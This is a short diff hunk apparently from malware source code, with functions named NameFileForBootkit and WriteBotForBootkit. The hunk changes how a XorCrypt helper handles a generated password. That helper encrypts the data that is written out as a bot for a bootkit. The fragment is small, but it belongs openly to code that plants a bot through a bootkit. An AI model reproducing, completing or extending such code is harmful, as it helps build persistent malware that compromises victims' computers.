@@ -19,9 +19,8 @@ char* NameFileForBootkit( char* buf, int c_buf )
 
 static void XorCrypt( BYTE* data, DWORD c_data )
 {
-	char* password = UIDCrypt::GeneratePassword();
-	XORCrypt::Crypt( password, data, c_data );
-	STR::Free(password);
+	string password = UIDCrypt::GeneratePassword();
+	XORCrypt::Crypt( password.t_str(), data, c_data );
 }
 
 bool WriteBotForBootkit( BYTE* data, DWORD c_data )
